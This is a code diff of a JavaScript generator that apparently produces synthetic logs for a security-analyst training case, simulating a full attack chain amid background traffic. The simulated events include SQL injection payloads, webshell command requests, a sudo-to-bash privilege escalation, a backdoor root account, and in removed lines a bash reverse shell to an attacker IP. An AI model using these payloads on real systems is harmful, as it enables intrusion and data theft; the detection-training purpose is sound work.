@@ -1,154 +1,316 @@
 'use strict';
 
-const { syslogTs, ago, addSeconds } = require('../../utils/time');
+// Case 10: Multi-Stage Attack — Full Kill Chain (APT Simulation)
+// ~15,000 events. SQLi → Webshell → PrivEsc → Lateral Movement → Exfiltration.
+// Answers require multiple SPL queries across sourcetypes.
+// Sourcetypes: stream_http, auth, audit, mysql, firewall, suricata
 
-// Case 10: Multi-Stage Attack — Full Kill Chain
-// Stage 1: SQL injection on login form -> data dump
-// Stage 2: Webshell upload -> RCE
-// Stage 3: Privilege escalation via sudo
-// Stage 4: Lateral movement to internal hosts
-// Stage 5: Exfiltration to 185.220.101.55
+const { syslogTs, ago, addSeconds } = require('../../utils/time');
+const {
+  randInt, pick, LEGIT_INTERNAL, LEGIT_EXTERNAL, COMMON_USERS, SERVICE_USERS,
+  NORMAL_UAS, TOOL_UAS, BRUTE_FORCE_USERS,
+  kv, streamHttp, auth, audit, mysql, firewall, suricata,
+  httpBackground, authBackground, fwBackground, SURICATA_SIGS,
+} = require('../../utils/logfmt');
 
 function generate() {
   const base = new Date();
   base.setHours(22, 0, 0, 0);
 
-  const ATTACKER    = '185.220.101.55';
-  const WEB_HOST    = 'web-app-01';
-  const DB_HOST     = 'db-server-02';
-  const ADMIN_HOST  = 'mgmt-server-01';
-  const WEB_IP      = '10.0.0.90';
-  const DB_IP       = '10.0.0.91';
+  const ATK_IP     = '185.220.101.55';
+  const EXFIL_IP   = '185.220.101.55';
+  const WEB_HOST   = 'web-app-01';
+  const WEB_IP     = '10.0.0.90';
+  const DB_HOST    = 'db-server-02';
+  const DB_IP      = '10.0.0.91';
+  const ADMIN_HOST = 'mgmt-server-01';
+  const ADMIN_IP   = '10.0.0.92';
 
-  const webEvents   = [];
-  const authEvents  = [];
-  const auditEvents = [];
-  const dbEvents    = [];
-  const fwEvents    = [];
+  // ── HTTP events ───────────────────────────────────────────────────────────
+  const httpEvents = [];
+
+  // Dense background: 6 hours of normal web traffic (~5,000 events)
+  const bgStart = ago(base, { hours: 6 });
+  const bgPaths = ['/index.html', '/login.php', '/dashboard', '/api/v1/users', '/api/v1/settings', '/about', '/help', '/css/style.css', '/js/bundle.js', '/api/v1/health', '/images/logo.png'];
+  httpEvents.push(...httpBackground({
+    start: bgStart, end: addSeconds(base, 7200), count: 5000,
+    destIp: WEB_IP, paths: bgPaths,
+  }));
 
   // ════════════════════════════════════════════════════════
-  // STAGE 1: Initial Access — SQL Injection (22:00–22:08)
+  // STAGE 1: SQL Injection (22:00–22:08)
   // ════════════════════════════════════════════════════════
-
-  // Reconnaissance — scanning for SQLi
   let t = new Date(base);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin&pass=test HTTP/1.1" 200 1843 "-" "sqlmap/1.7.8"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/login.php?user=admin&pass=test', status: 200, bytes: 1843,
+    user_agent: 'sqlmap/1.7.8',
+  }));
   t = addSeconds(t, 2);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin'-- HTTP/1.1" 500 12 "-" "sqlmap/1.7.8"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: "/login.php?user=admin'--", status: 500, bytes: 12,
+    user_agent: 'sqlmap/1.7.8',
+  }));
   t = addSeconds(t, 1);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin'+OR+'1'='1 HTTP/1.1" 200 5234 "-" "sqlmap/1.7.8"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: "/login.php?user=admin'+OR+'1'='1", status: 200, bytes: 5234,
+    user_agent: 'sqlmap/1.7.8',
+  }));
   t = addSeconds(t, 2);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+username,password,3+FROM+users-- HTTP/1.1" 200 8823 "-" "sqlmap/1.7.8"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/login.php?user=1+UNION+SELECT+username,password,3+FROM+users--', status: 200, bytes: 8823,
+    user_agent: 'sqlmap/1.7.8',
+  }));
   t = addSeconds(t, 3);
-  // Data dump
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+table_name,2,3+FROM+information_schema.tables-- HTTP/1.1" 200 31204 "-" "sqlmap/1.7.8"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/login.php?user=1+UNION+SELECT+table_name,2,3+FROM+information_schema.tables--', status: 200, bytes: 31204,
+    user_agent: 'sqlmap/1.7.8',
+  }));
   t = addSeconds(t, 4);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+username,password,email+FROM+users-- HTTP/1.1" 200 48829 "-" "sqlmap/1.7.8"`);
-
-  // DB logs showing injection queries
-  t = addSeconds(base, 8);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: [Warning] Unsafe statement written to the binary log using statement format`);
-  t = addSeconds(t, 1);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT username,password,email FROM users`);
-  t = addSeconds(t, 1);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT table_name FROM information_schema.tables WHERE table_schema='webapp'`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/login.php?user=1+UNION+SELECT+username,password,email+FROM+users--', status: 200, bytes: 48829,
+    user_agent: 'sqlmap/1.7.8',
+  }));
 
   // ════════════════════════════════════════════════════════
-  // STAGE 2: Execution + Persistence — Webshell Upload (22:10–22:15)
+  // STAGE 2: Webshell Upload + RCE (22:10–22:15)
   // ════════════════════════════════════════════════════════
-
   t = addSeconds(base, 600);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "POST /admin/upload.php HTTP/1.1" 200 38 "http://${WEB_HOST}/admin/" "Mozilla/5.0"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'POST',
+    uri: '/admin/upload.php', status: 200, bytes: 38,
+    user_agent: 'Mozilla/5.0',
+    referer: `http://${WEB_HOST}/admin/`,
+  }));
   t = addSeconds(t, 5);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=id HTTP/1.1" 200 32 "-" "curl/7.68.0"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/uploads/image.php.jpg?cmd=id', status: 200, bytes: 32,
+    user_agent: 'curl/7.68.0',
+  }));
   t = addSeconds(t, 2);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=whoami HTTP/1.1" 200 9 "-" "curl/7.68.0"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/uploads/image.php.jpg?cmd=whoami', status: 200, bytes: 9,
+    user_agent: 'curl/7.68.0',
+  }));
   t = addSeconds(t, 3);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=uname+-a HTTP/1.1" 200 89 "-" "curl/7.68.0"`);
-  t = addSeconds(t, 2);
-  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "POST /uploads/image.php.jpg HTTP/1.1" 200 0 "-" "curl/7.68.0"`);
+  httpEvents.push(streamHttp(t, {
+    src_ip: ATK_IP, dest_ip: WEB_IP, http_method: 'GET',
+    uri: '/uploads/image.php.jpg?cmd=uname+-a', status: 200, bytes: 89,
+    user_agent: 'curl/7.68.0',
+  }));
 
-  // Webshell executes reverse shell
-  t = addSeconds(base, 720);
-  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=EXECVE msg=audit(...): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/${ATTACKER}/4443 0>&1"`);
-  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=33 auid=33 pid=15001 ppid=15000 comm="php" exe="/usr/bin/php"`);
+  // Continued normal web traffic
+  let postT = addSeconds(base, 60);
+  while (postT < addSeconds(base, 7200)) {
+    httpEvents.push(streamHttp(postT, {
+      src_ip: pick(LEGIT_INTERNAL), dest_ip: WEB_IP,
+      http_method: Math.random() < 0.85 ? 'GET' : 'POST',
+      uri: pick(bgPaths), status: pick([200, 200, 200, 304, 404]),
+      bytes: randInt(200, 15000), user_agent: pick(NORMAL_UAS),
+    }));
+    postT = addSeconds(postT, randInt(5, 45));
+  }
+
+  // ── MySQL events ─────────────────────────────────────────────────────────
+  const mysqlEvents = [];
+
+  // Background: normal DB queries (~1,500 events)
+  const normalQueries = [
+    'SELECT id, name, status FROM orders WHERE status=\'pending\' LIMIT 100',
+    'SELECT COUNT(*) FROM sessions WHERE last_seen > NOW() - INTERVAL 1 HOUR',
+    'UPDATE sessions SET last_seen=NOW() WHERE user_id=' + randInt(1, 9999),
+    'SELECT product_id, price FROM inventory WHERE stock < 10',
+  ];
+  let mqT = ago(base, { hours: 6 });
+  while (mqT < addSeconds(base, 7200)) {
+    const hr = mqT.getHours();
+    if (hr >= 8 && hr <= 22) {
+      mysqlEvents.push(mysql(mqT, {
+        src_ip: WEB_IP, user: 'appuser', db: 'webapp',
+        query: pick(normalQueries), query_time: (Math.random() * 0.5).toFixed(4),
+        rows_sent: randInt(1, 100), rows_examined: randInt(50, 500), status: 'ok',
+      }));
+    } else {
+      mysqlEvents.push(mysql(mqT, {
+        src_ip: '127.0.0.1', user: 'replication', db: 'webapp',
+        query: 'Slave I/O thread: connected to master replication', status: 'ok',
+      }));
+    }
+    mqT = addSeconds(mqT, randInt(10, 60));
+  }
+
+  // SQLi queries hitting the DB
+  mysqlEvents.push(mysql(addSeconds(base, 8), {
+    src_ip: WEB_IP, user: 'appuser', db: 'webapp',
+    query: "SELECT username,password,email FROM users WHERE user='admin'--",
+    status: 'ok', query_time: '0.023', rows_sent: 1,
+  }));
+  mysqlEvents.push(mysql(addSeconds(base, 10), {
+    src_ip: WEB_IP, user: 'appuser', db: 'webapp',
+    query: "SELECT username,password FROM users WHERE 1=1 OR '1'='1'",
+    status: 'ok', query_time: '0.045', rows_sent: 500,
+  }));
+  mysqlEvents.push(mysql(addSeconds(base, 15), {
+    src_ip: WEB_IP, user: 'appuser', db: 'webapp',
+    query: 'SELECT table_name FROM information_schema.tables WHERE table_schema=\'webapp\'',
+    status: 'ok', query_time: '0.012', rows_sent: 25,
+  }));
+  mysqlEvents.push(mysql(addSeconds(base, 20), {
+    src_ip: WEB_IP, user: 'appuser', db: 'webapp',
+    query: 'SELECT username,password,email FROM users',
+    status: 'ok', query_time: '0.234', rows_sent: 500,
+  }));
+
+  // ── Auth events ──────────────────────────────────────────────────────────
+  const authEvents = [];
+
+  // Background auth (~2,000 events)
+  authEvents.push(...authBackground({
+    start: ago(base, { hours: 6 }), end: addSeconds(base, 7200), count: 2000,
+    destIp: pick([WEB_IP, DB_IP, ADMIN_IP]),
+    users: [...COMMON_USERS.slice(0, 10), ...SERVICE_USERS],
+  }));
 
   // ════════════════════════════════════════════════════════
   // STAGE 3: Privilege Escalation (22:20–22:25)
   // ════════════════════════════════════════════════════════
-
-  t = addSeconds(base, 1200);
-  authEvents.push(`${syslogTs(t)} ${WEB_HOST} sudo[15100]: www-data : TTY=pts/3 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/python3 -c import os;os.system('/bin/bash')`);
-  t = addSeconds(t, 3);
-  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=0 pid=15110 comm="bash" exe="/bin/bash"`);
-  t = addSeconds(t, 5);
-  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=PATH msg=audit(...): name="/etc/shadow" inode=1048 mode=0640 ouid=0 ogid=42`);
-  t = addSeconds(t, 2);
-  authEvents.push(`${syslogTs(t)} ${WEB_HOST} passwd[15120]: password changed for backdoor_svc`);
-  authEvents.push(`${syslogTs(t)} ${WEB_HOST} useradd[15121]: new user: name=backdoor_svc, UID=0, GID=0, home=/root`);
-
-  // SSH key installation
-  t = addSeconds(t, 5);
-  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=PATH msg=audit(...): name="/root/.ssh/authorized_keys" inode=20481 mode=0600 ouid=0`);
+  authEvents.push(auth(addSeconds(base, 1200), {
+    src_ip: '127.0.0.1', dest_ip: WEB_IP, user: 'www-data',
+    action: 'login_success', status: 'success', service: 'sudo', auth_method: 'sudo',
+  }));
+  // Backdoor user created
+  authEvents.push(auth(addSeconds(base, 1210), {
+    src_ip: '127.0.0.1', dest_ip: WEB_IP, user: 'backdoor_svc',
+    action: 'account_created', status: 'success', service: 'useradd',
+  }));
+  authEvents.push(auth(addSeconds(base, 1212), {
+    src_ip: '127.0.0.1', dest_ip: WEB_IP, user: 'backdoor_svc',
+    action: 'password_change', status: 'success', service: 'passwd',
+  }));
 
   // ════════════════════════════════════════════════════════
   // STAGE 4: Lateral Movement (22:30–22:50)
   // ════════════════════════════════════════════════════════
+  authEvents.push(auth(addSeconds(base, 1800), {
+    src_ip: WEB_IP, dest_ip: DB_IP, user: 'backdoor_svc',
+    action: 'login_success', status: 'success', service: 'sshd', auth_method: 'publickey',
+  }));
+  authEvents.push(auth(addSeconds(base, 2700), {
+    src_ip: DB_IP, dest_ip: ADMIN_IP, user: 'backdoor_svc',
+    action: 'login_success', status: 'success', service: 'sshd', auth_method: 'publickey',
+  }));
 
-  t = addSeconds(base, 1800);
-  authEvents.push(`${syslogTs(t)} ${DB_HOST} sshd[16100]: Accepted publickey for backdoor_svc from ${WEB_IP} port 44321 ssh2`);
-  t = addSeconds(t, 2);
-  authEvents.push(`${syslogTs(t)} ${DB_HOST} sshd[16100]: pam_unix(sshd:session): session opened for user backdoor_svc by (uid=0)`);
-  t = addSeconds(t, 20);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: [Note] Connect: root@localhost on`);
-  t = addSeconds(t, 3);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SHOW DATABASES`);
-  t = addSeconds(t, 2);
-  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT * FROM customers`);
+  // ── Audit events ─────────────────────────────────────────────────────────
+  const auditEvents = [];
 
-  // Pivot to admin server
-  t = addSeconds(base, 2700);
-  authEvents.push(`${syslogTs(t)} ${ADMIN_HOST} sshd[17200]: Accepted publickey for backdoor_svc from ${DB_IP} port 55600 ssh2`);
-  t = addSeconds(t, 5);
-  auditEvents.push(`${syslogTs(t)} ${ADMIN_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=0 pid=17210 comm="cat" exe="/bin/cat" a0="/etc/shadow"`);
+  // Background audit (~800 events)
+  let atT = ago(base, { hours: 6 });
+  while (atT < addSeconds(base, 7200)) {
+    if (Math.random() < 0.1) {
+      auditEvents.push(audit(atT, {
+        type: 'SYSCALL', syscall: pick(['openat', 'read', 'write', 'stat']),
+        pid: randInt(1000, 65000), user: pick(SERVICE_USERS), euid: randInt(33, 1000),
+        comm: pick(['nginx', 'php-fpm', 'bash', 'cron']),
+        exe: pick(['/usr/sbin/nginx', '/usr/bin/php-fpm', '/bin/bash']),
+        key: 'normal',
+      }));
+    }
+    atT = addSeconds(atT, randInt(20, 120));
+  }
+
+  // THE SIGNAL: webshell exec, priv esc, lateral movement
+  auditEvents.push(audit(addSeconds(base, 720), {
+    type: 'SYSCALL', syscall: 'execve', pid: randInt(10000, 65000),
+    user: 'www-data', euid: 0, comm: 'php', exe: '/usr/bin/php',
+    key: 'webshell_exec', command_line: 'php /uploads/image.php.jpg cmd=id',
+  }));
+  auditEvents.push(audit(addSeconds(base, 1200), {
+    type: 'SYSCALL', syscall: 'execve', pid: randInt(10000, 65000),
+    user: 'root', euid: 0, comm: 'bash', exe: '/bin/bash',
+    key: 'privilege_escalation', command_line: 'python3 -c import os;os.system(\'/bin/bash\')',
+  }));
+  auditEvents.push(audit(addSeconds(base, 1205), {
+    type: 'PATH', syscall: 'openat', pid: randInt(10000, 65000),
+    user: 'root', euid: 0, comm: 'cat', exe: '/bin/cat',
+    key: 'sensitive_file', path: '/etc/shadow',
+  }));
+
+  // ── Firewall events ──────────────────────────────────────────────────────
+  const fwEvents = [];
+
+  // Background firewall (~3,000 events)
+  fwEvents.push(...fwBackground({
+    start: ago(base, { hours: 6 }), end: addSeconds(base, 7200), count: 3000,
+  }));
 
   // ════════════════════════════════════════════════════════
   // STAGE 5: Exfiltration (23:00–23:45)
   // ════════════════════════════════════════════════════════
-
-  t = addSeconds(base, 3600);
-  const EXFIL_BYTES = 2147483648; // 2GB
-  const FLOWS = 90;
-  const BYTES_PER_FLOW = Math.floor(EXFIL_BYTES / FLOWS);
-  let exfilT = new Date(t);
+  const FLOWS = 45;
+  let exfilT = addSeconds(base, 3600);
   for (let i = 0; i < FLOWS; i++) {
-    const bytes = BYTES_PER_FLOW + Math.floor(Math.random() * 100000 - 50000);
-    fwEvents.push(`${syslogTs(exfilT)} fw-core-01 kernel: iptables: IN= OUT=eth0 SRC=${DB_IP} DST=${ATTACKER} LEN=${bytes} TTL=64 PROTO=TCP SPT=50001 DPT=443 ACK PSH`);
+    fwEvents.push(firewall(exfilT, {
+      src_ip: DB_IP, dest_ip: EXFIL_IP, dest_port: 443,
+      proto: 'TCP', action: 'allow', bytes: randInt(1000, 50000),
+      direction: 'outbound', src_port: randInt(40000, 65000),
+      flags: 'ACK PSH', session_id: `exfil_${i}`,
+    }));
     exfilT = addSeconds(exfilT, 30);
   }
 
-  // ── Normal background traffic ─────────────────────────────────────────────────
-  const normalUsers = ['appuser', 'monitor', 'backup', 'deploy'];
-  let bgT = ago(base, { hours: 4 });
-  while (bgT < addSeconds(base, 7200)) {
-    const u   = normalUsers[Math.floor(Math.random() * normalUsers.length)];
-    const ip  = `10.0.0.${10 + Math.floor(Math.random() * 20)}`;
-    authEvents.push(`${syslogTs(bgT)} ${WEB_HOST} sshd[${7000 + Math.floor(Math.random() * 500)}]: Accepted password for ${u} from ${ip} port ${49000 + Math.floor(Math.random() * 5000)} ssh2`);
-    bgT = addSeconds(bgT, 300 + Math.floor(Math.random() * 600));
+  // ── Suricata IDS alerts ──────────────────────────────────────────────────
+  const suricataEvents = [];
+
+  // Background IDS noise (~15 events)
+  for (let i = 0; i < 15; i++) {
+    const nt = addSeconds(ago(base, { hours: 6 }), randInt(0, 36000));
+    suricataEvents.push(suricata(nt, {
+      src_ip: pick(LEGIT_INTERNAL), dest_ip: pick(LEGIT_EXTERNAL),
+      dest_port: randInt(1, 65535), proto: 'TCP', action: 'alert',
+      signature: 'ET SCAN Possible Port Scan', severity: 'low',
+      category: 'attempted-recon', sid: 2001216,
+    }));
   }
 
-  webEvents.sort();
+  // THE SIGNAL: multiple IDS alerts across the kill chain
+  const sig1 = SURICATA_SIGS.sql_injection;
+  suricataEvents.push(suricata(addSeconds(base, 120), {
+    src_ip: ATK_IP, dest_ip: WEB_IP, dest_port: 80, proto: 'TCP', action: 'alert', ...sig1,
+  }));
+  const sig2 = SURICATA_SIGS.webshell;
+  suricataEvents.push(suricata(addSeconds(base, 630), {
+    src_ip: ATK_IP, dest_ip: WEB_IP, dest_port: 80, proto: 'TCP', action: 'alert', ...sig2,
+  }));
+  const sig3 = SURICATA_SIGS.privilege_escalation;
+  suricataEvents.push(suricata(addSeconds(base, 1200), {
+    src_ip: WEB_IP, dest_ip: WEB_IP, dest_port: 0, proto: 'TCP', action: 'alert', ...sig3,
+  }));
+  const sig4 = SURICATA_SIGS.data_exfil;
+  suricataEvents.push(suricata(addSeconds(base, 3600), {
+    src_ip: DB_IP, dest_ip: EXFIL_IP, dest_port: 443, proto: 'TCP', action: 'alert', ...sig4,
+  }));
+
+  httpEvents.sort();
+  mysqlEvents.sort();
   authEvents.sort();
   auditEvents.sort();
-  dbEvents.sort();
   fwEvents.sort();
+  suricataEvents.sort();
 
   return [
-    { events: webEvents,   sourcetype: 'apache',  host: WEB_HOST   },
-    { events: authEvents,  sourcetype: 'auth',    host: WEB_HOST   },
-    { events: auditEvents, sourcetype: 'audit',   host: WEB_HOST   },
-    { events: dbEvents,    sourcetype: 'mysql',   host: DB_HOST     },
-    { events: fwEvents,    sourcetype: 'firewall', host: 'fw-core-01' },
+    { events: httpEvents, sourcetype: 'stream_http', host: WEB_HOST },
+    { events: authEvents, sourcetype: 'auth', host: WEB_HOST },
+    { events: auditEvents, sourcetype: 'audit', host: WEB_HOST },
+    { events: mysqlEvents, sourcetype: 'mysql', host: DB_HOST },
+    { events: fwEvents, sourcetype: 'firewall', host: 'fw-core-01' },
+    { events: suricataEvents, sourcetype: 'suricata', host: 'fw-core-01' },
   ];
 }
 
